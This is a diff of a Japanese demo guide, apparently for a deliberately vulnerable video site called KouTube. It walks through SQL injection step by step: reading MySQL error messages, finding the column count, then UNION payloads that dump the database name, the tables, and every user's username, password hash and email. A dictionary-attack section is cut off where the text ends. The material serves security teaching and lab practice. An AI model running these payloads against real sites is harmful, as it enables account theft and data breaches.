@@ -6,43 +6,66 @@
 
 ## 1. SQLインジェクション攻撃デモ
 
-### 1.1 データベース名の取得
+### 1.1 エラーからSQL構造を推測
+1 = '1'などを入力すると以下のエラーメッセージが表示される。
+```
+予期せぬエラーが発生しました: 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1'%' ORDER BY upload_at DESC' at line 1
+```
+・このエラーメッセージからわかること
+<br>MySQLのエラー表示の特徴→ 構文エラーが起きた付近のSQLトークンをそのまま出力する
+
+%直後にユーザーが入力していない ORDER BY upload_at DESC が現れる→ Webアプリ側がSQL末尾に自動的に ORDER BY を付与していると推測
+
+% はワイルドカードで、通常は LIKE句で使われる→ SQLの末尾が LIKE ‘%入力%’ ORDER BY upload_at DESC であると判断
+
+### 1.2 列数を試行で特定
+' AND 1=2 UNION SELECT 1 --'と入力すると以下のエラーメッセージが表示される。
+```
+予期せぬエラーが発生しました: 1222 (21000): The used SELECT statements have a different number of columns
+```
+このエラーが出なくなるまで列数を１つずつ増やす
+　→今回の場合７列であるため以下でエラーが出なくなる
+```sql
+' AND 1=2 UNION SELECT 1, 2, 3, 4, 5, 6, 7 --'
+ ```
+
+### 1.3 データベース名の取得
 動画検索フィールドまたはコメント投稿欄に以下のペイロードを入力：
 
 ```sql
-' AND 1=2 UNION SELECT 1, 2, DATABASE(), 'dummy_description', 'dummy_filepath.mp4', 5, '2025-01-01 00:00:00' --'
+' AND 1=2 UNION SELECT 1, 2, DATABASE(), 4, 5, 6, 7 -- '
 ```
 
 **期待される結果**: データベース名（KouTube）が表示される
 
-### 1.2 テーブル名の取得
+### 1.4 テーブル名の取得
 次に以下のペイロードを使用してテーブル名を取得：
 
 ```sql
-' AND 1=2 UNION SELECT 1, 2, table_name, 'dummy_description', 'dummy_filepath.mp4', 5, '2025-01-01 00:00:00' FROM information_schema.tables WHERE table_schema = 'KouTube' -- '
+' AND 1=2 UNION SELECT 1, 2, GROUP_CONCAT(table_name), 4, 5, 6, 7 FROM information_schema.tables WHERE table_schema = 'KouTube' -- '
 ```
 
 **期待される結果**: データベース内のテーブル名一覧が表示される
 
-### 1.3 usersテーブルのカラム構造取得
+### 1.5 usersテーブルのカラム構造取得
 usersテーブルのカラム名を取得：
 
 ```sql
-' AND 1=2 UNION SELECT 1, 2, GROUP_CONCAT(column_name), 'dummy_description', 'dummy_filepath.mp4', 5, '2025-01-01 00:00:00' FROM information_schema.columns WHERE table_schema = 'KouTube' AND table_name = 'users' -- '
+' AND 1=2 UNION SELECT 1, 2, GROUP_CONCAT(column_name), 4, 5, 6, 7 FROM information_schema.columns WHERE table_schema = 'KouTube' AND table_name = 'users' -- '
 ```
 
 **期待される結果**: usersテーブルのカラム名（id, username, password, email等）が表示される
 
-### 1.4 機密情報の取得
+### 1.6 機密情報の取得
 ユーザー情報（ユーザー名、パスワード、メールアドレス）を取得：
 
 ```sql
-' AND 1=2 UNION SELECT id, id, CONCAT_WS('\n', username, password, email), '', '', 0, NOW() FROM users ORDER BY id ASC -- '
+' AND 1=2 UNION SELECT 1, 2, CONCAT_WS('\n', username, password, email), 4, 5, 6, 7 FROM users -- '
 ```
 
 **期待される結果**: 全ユーザーの機密情報が表示される
 
-### 1.5 辞書攻撃によるパスワード解読
+### 1.7 辞書攻撃によるパスワード解読
 1.4で取得したハッシュ化されたパスワードに対して辞書攻撃を実行：
 
 1. **攻撃準備**:
